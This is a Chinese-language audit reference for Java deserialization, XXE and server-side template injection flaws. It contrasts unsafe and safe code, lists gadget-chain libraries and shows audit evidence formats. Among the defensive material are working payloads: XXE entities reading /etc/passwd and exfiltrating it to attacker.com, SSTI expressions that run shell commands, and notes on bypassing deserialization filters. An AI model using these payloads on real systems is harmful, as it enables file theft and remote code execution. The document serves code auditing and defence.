# Java 序列化类漏洞审计模式参考

3 类序列化相关漏洞的危险代码 / 安全代码对比 + Gadget 依赖表 + EVID_* 证据格式示例。

---

## 1. Java 原生反序列化

### 1.1 入口点代码示例

```java
// 危险: 直接从网络流反序列化
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject(); // 任意类实例化

// 危险: HTTP 请求体反序列化
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();

// 危险: XMLDecoder（可构造任意方法调用）
XMLDecoder decoder = new XMLDecoder(new BufferedInputStream(request.getInputStream()));
Object obj = decoder.readObject();

// 危险: Base64 解码后反序列化（Cookie/参数传递常见模式）
byte[] data = Base64.getDecoder().decode(request.getParameter("data"));
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
Object obj = ois.readObject();
```

### 1.2 HTTP 场景识别

| 格式 | 特征 | 识别方式 |
|------|------|----------|
| Java 原生序列化 | 魔术字节 `AC ED 00 05` | Hex 查看请求 body 前 4 字节 |
| Base64 编码 | 以 `rO0AB` 开头 | Base64 解码后检查魔术字节 |
| Gzip + Base64 | `H4sIAAAA` 开头 | Base64 解码 → Gzip 解压 |
| XMLDecoder | `<java>` / `<object>` XML 标签 | 检查 XML 结构 |

### 1.3 常见触发点

```java
// ViewState: JSF STATE_SAVING_METHOD=client 时 ViewState 经用户传递可篡改
// Cookie 序列化存储
byte[] data = Base64.getDecoder().decode(cookie.getValue());
UserSession session = (UserSession) new ObjectInputStream(new ByteArrayInputStream(data)).readObject();
// Spring Session + Redis: 默认 JdkSerializationRedisSerializer，Redis 可写入即可利用
// WebSocket 二进制消息反序列化
// RMI/JMX: 协议本身基于 Java 序列化，攻击者可向端口发送恶意对象
```

### 1.4 Gadget Chain 依赖清单

| 依赖 | 版本范围 | 可用链 | 触发效果 |
|------|----------|--------|----------|
| commons-collections 3.x | 3.0 - 3.2.1 | InvokerTransformer / ChainedTransformer / LazyMap | RCE |
| commons-collections 4.x | 4.0 | InstantiateTransformer / TransformingComparator | RCE |
| commons-beanutils | 1.x | BeanComparator → TemplatesImpl | RCE |
| spring-core | 4.x - 5.x | MethodInvokeTypeProvider | RCE |
| JDK 7u21 | ≤ 7u21 | AnnotationInvocationHandler → TemplatesImpl | RCE |
| JDK 8u20 | ≤ 8u20 | BeanContextSupport → 绕过 7u21 修复 | RCE |
| Groovy | 1.7 - 2.4.3 | MethodClosure / ConvertedClosure | RCE |
| hibernate-core | 3.x - 5.x | BasicPropertyAccessor$BasicGetter → TemplatesImpl | RCE |
| spring-tx | 任意 | JtaTransactionManager → JNDI Lookup | JNDI → RCE |
| rome | 1.0 | ObjectBean → TemplatesImpl | RCE |
| c3p0 | 0.9.x | PoolBackedDataSource → JNDI / 远程类加载 | RCE |

审计关键: `mvn dependency:tree` / `gradle dependencies` 列出完整依赖树逐一比对。

### 1.5 防御绕过场景

```
自定义 ClassLoader: 可能导致 ObjectInputFilter 类名匹配失效
JNDI 注入: JtaTransactionManager → InitialContext.lookup(attackerLDAP)
  高版本 JDK 限制远程 codebase，但 BeanFactory + ELProcessor 可绕过
二次反序列化: SignedObject.getObject() 内部调用 readObject()，外层白名单通过后内层绕过
类名混淆: [Lorg.apache.commons.collections.Transformer; 数组类型绕过黑名单
```

### 1.6 JEP 290 ObjectInputFilter 与白名单 resolveClass

```java
// 白名单模式（推荐）— !* 拒绝所有未匹配类
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.model.*;java.util.*;java.lang.*;!*");

// 自定义 resolveClass 白名单
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of("com.myapp.dto.UserDTO", "java.util.ArrayList");
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED.contains(desc.getName()))
            throw new InvalidClassException("Unauthorized: " + desc.getName());
        return super.resolveClass(desc);
    }
}
```

白名单默认拒绝、新 Gadget 无法绕过；黑名单永远滞后于攻击者，仅作过渡方案。

### 1.7 反序列化 EVID 证据示例

```
[EVID_DESER_READOBJECT_CALL]  com/app/service/SessionService.java:78
  new ObjectInputStream(new ByteArrayInputStream(data)).readObject()
[EVID_DESER_DATA_SOURCE]  :72-77
  data = Base64.getDecoder().decode(request.getCookie("session_token"))
  来源: Cookie，用户完全可控
[EVID_DESER_GADGET_AVAILABILITY]
  commons-collections:3.2.1 → InvokerTransformer 链可用
  commons-beanutils:1.9.3 → BeanComparator 链可用
[EVID_DESER_FILTER_STATUS]
  ObjectInputFilter: 未配置 | resolveClass: 未重写 → 无任何防御 → Critical
```

---

## 2. XXE (XML 外部实体注入)

### 2.1 五种解析器不安全 vs 安全配置

#### DocumentBuilderFactory

```java
// 危险: 默认配置
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
db.parse(new InputSource(new StringReader(userXml))); // XXE

// 安全: 禁用 DTD（推荐）
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 安全（备选）: 禁用外部实体
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

#### SAXParserFactory

```java
// 危险: 默认配置
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.newSAXParser().parse(new InputSource(new StringReader(userXml)), handler); // XXE

// 安全
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

#### XMLInputFactory (StAX)

```java
// 危险: 默认配置
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.createXMLStreamReader(new StringReader(userXml)); // XXE

// 安全
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

#### TransformerFactory

```java
// 危险: 默认允许外部 DTD 和样式表
TransformerFactory tf = TransformerFactory.newInstance();
tf.newTransformer(new StreamSource(new StringReader(userXslt))); // XXE

// 安全
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

#### SchemaFactory

```java
// 危险: 加载用户 Schema 可触发 XXE
SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
sf.newSchema(new StreamSource(new StringReader(userSchema))); // XXE

// 安全
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
```

### 2.2 攻击载荷与 Java 特有协议

```xml
<!-- 文件读取（有回显） -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

<!-- SSRF 内网探测 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">]><root>&xxe;</root>

<!-- 盲 XXE 带外外带 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]><root>&send;</root>
<!-- evil.dtd: <!ENTITY % p "<!ENTITY send SYSTEM 'ftp://attacker.com/%file;'>"> %p; -->
```

| 协议 | 效果 | 备注 |
|------|------|------|
| `file://` | 读取本地文件 | 最常用 |
| `http(s)://` | SSRF / OOB 外带 | 内网探测 |
| `ftp://` | OOB 外带（支持多行） | 盲 XXE 首选 |
| `jar:` | 远程文件下载 + 解压 | `jar:http://evil/a.jar!/f` |
| `netdoc://` | 等价 file://（旧版 JDK） | JDK 8 以前 |

### 2.3 SOAP / SVG / Spring-WS / CXF

```java
// SOAP 消息本质是 XML，天然 XXE 风险；JAX-WS 需检查底层解析器配置
// Spring-WS: 新版已默认禁用外部实体，老版本需手动配置 SaajSoapMessageFactory
// Apache CXF: 3.1.12+ / 3.2.4+ 默认禁用 DTD，老版本需配置 allowInsecureParser=false
// SVG 上传: SVG 是 XML 格式，服务端解析 SVG 时若未安全配置则触发 XXE
// 恶意 SVG: <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
//   <svg><text>&xxe;</text></svg>
```

### 2.4 XXE EVID 证据示例

```
[EVID_XXE_PARSER_CALL]  com/app/service/XmlImportService.java:45
  DocumentBuilder db = dbf.newDocumentBuilder(); doc = db.parse(inputSource);
[EVID_XXE_PARSER_CONFIG]  :38-44
  DocumentBuilderFactory.newInstance() 未调用 setFeature("disallow-doctype-decl", true)
[EVID_XXE_INPUT_SOURCE]
  Source: ImportController.java:23 — XML 来自 multipart 文件上传，Content-Type 未限制
[EVID_XXE_RESPONSE_BEHAVIOR]
  解析结果通过 XPath 提取后回显到页面 → 有回显 XXE → High-Critical
```

---

## 3. SSTI (服务端模板注入)

### 3.1 Velocity 代码执行

```java
// 危险: 用户输入作为模板内容
Velocity.evaluate(ctx, writer, "tag", userTemplate); // userTemplate 可控 → RCE

// RCE 链路:
// #set($rt=$class.forName("java.lang.Runtime"))
// #set($runtime=$rt.getMethod("getRuntime").invoke(null))
// $runtime.exec("id")
// 简化: $class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami")

// 安全: SecureUberspector 禁用 Class.forName/getClass/getClassLoader
ve.setProperty("runtime.introspector.uberspect",
    "org.apache.velocity.util.introspection.SecureUberspector");
// + 不在 context 中放入 class/runtime 等危险对象
```

### 3.2 FreeMarker 代码执行

```java
// 危险: 用户输入作为模板源编译
Template template = new Template("t", new StringReader(userInput), cfg);
template.process(dataModel, writer); // userInput 可控 → RCE

// RCE 载荷:
// <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
// <#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
// ${oc("java.lang.ProcessBuilder", ["id"]).start()}

// 安全: 禁用 ?new() 和 ?api
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER); // 完全禁用 ?new()
cfg.setAPIBuiltinEnabled(false); // 禁用 ?api 防止通过 Java API 绕过沙箱
// SAFER_RESOLVER 仅禁止 Execute/ObjectConstructor/JythonRuntime，不够彻底
```

### 3.3 Thymeleaf SSTI

```java
// 危险: 控制器返回值拼接用户输入
@GetMapping("/user/{input}")
public String userPage(@PathVariable String input) {
    return "user/" + input; // input 可控 → SSTI
}
// input = "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
// 预处理 __${...}__ 触发 SpEL → T() 访问 Runtime → RCE

// 隐蔽触发: void 方法 Spring 默认将 URL 路径映射为视图名
@GetMapping("/doc/{page}")
public void docPage(@PathVariable String page) {} // 同样危险

// 带回显 RCE:
// __${new java.util.Scanner(T(Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}__::.x

// 安全: 视图名白名单（核心防御）
private static final Set<String> ALLOWED_VIEWS = Set.of("home", "profile", "settings");
if (!ALLOWED_VIEWS.contains(name)) return "error/404";
return "pages/" + name;
// Thymeleaf 3.x 无法禁用预处理，核心是不让用户输入进入视图名
```

### 3.4 其他模板引擎简述

| 引擎 | 风险等级 | 说明 |
|------|----------|------|
| Pebble | 低 | 默认不允许访问 Java 类，但自定义 Extension 可能引入危险函数 |
| Groovy Template | 极高 | 模板本质是 Groovy 代码，用户可控即 RCE；SecureASTCustomizer 绕过手段众多 |
| Jade4J | 中 | 表达式引擎基于 JEXL，需评估 JEXL 沙箱配置 |

### 3.5 SSTI EVID 证据示例

#### Velocity EVID

```
[EVID_SSTI_VELOCITY_EVALUATE]  com/app/service/EmailService.java:112
  Velocity.evaluate(ctx, writer, "email", templateContent)
[EVID_SSTI_TEMPLATE_SOURCE]  :105-111
  templateContent 从数据库 email_template 表读取，管理员可编辑
[EVID_SSTI_SANDBOX_STATUS]
  SecureUberspector: 未配置 → $class.forName() 可达 RCE → High
```

#### FreeMarker EVID

```
[EVID_SSTI_FREEMARKER_TEMPLATE]  com/app/controller/ReportController.java:67
  new Template("report", new StringReader(templateStr), cfg).process(model, writer)
[EVID_SSTI_TEMPLATE_SOURCE]  :58-66
  templateStr = request.getParameter("template") → HTTP 参数直接传入，完全可控
[EVID_SSTI_SANDBOX_STATUS]
  TemplateClassResolver: UNRESTRICTED → ?new() 可实例化任意类
  apiBuiltinEnabled: true → ?api 可访问 Java API → Critical
```

#### Thymeleaf EVID

```
[EVID_SSTI_THYMELEAF_VIEWNAME]  com/app/controller/PageController.java:34
  return "templates/" + lang + "/index"
[EVID_SSTI_USER_INPUT]
  lang = @PathVariable，无白名单 → 可注入 __${...}__ 预处理表达式
[EVID_SSTI_SPEL_EXECUTION]
  Thymeleaf 预处理触发 SpEL，StandardEvaluationContext 默认启用 T() → RCE → Critical
```
